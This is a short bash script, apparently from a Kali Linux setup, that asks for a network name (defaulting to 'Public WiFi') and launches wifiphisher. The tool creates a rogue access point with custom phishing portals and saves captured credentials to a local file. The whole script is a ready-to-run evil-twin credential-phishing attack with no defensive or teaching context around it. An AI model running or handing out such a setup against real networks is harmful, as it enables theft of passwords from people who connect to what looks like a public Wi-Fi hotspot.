#!/bin/bash

# sudo /home/kali/scripts/initwifi.sh
read -p "essid name: " essid
essid=${essid:-"Public WiFi"}
sudo wifiphisher -pPD /home/kali/working/phisher/portals -aI wlan1ap -eI wlan1mon -nD --essid "$essid" --logging -lP /home/kali/working/phisher/logs/log -cP /home/kali/working/phisher/creds/cred
#sudo systemctl restart hotspot
echo 'remember to clean up the wifi interfaces with:'
echo 'cleanupwifi'
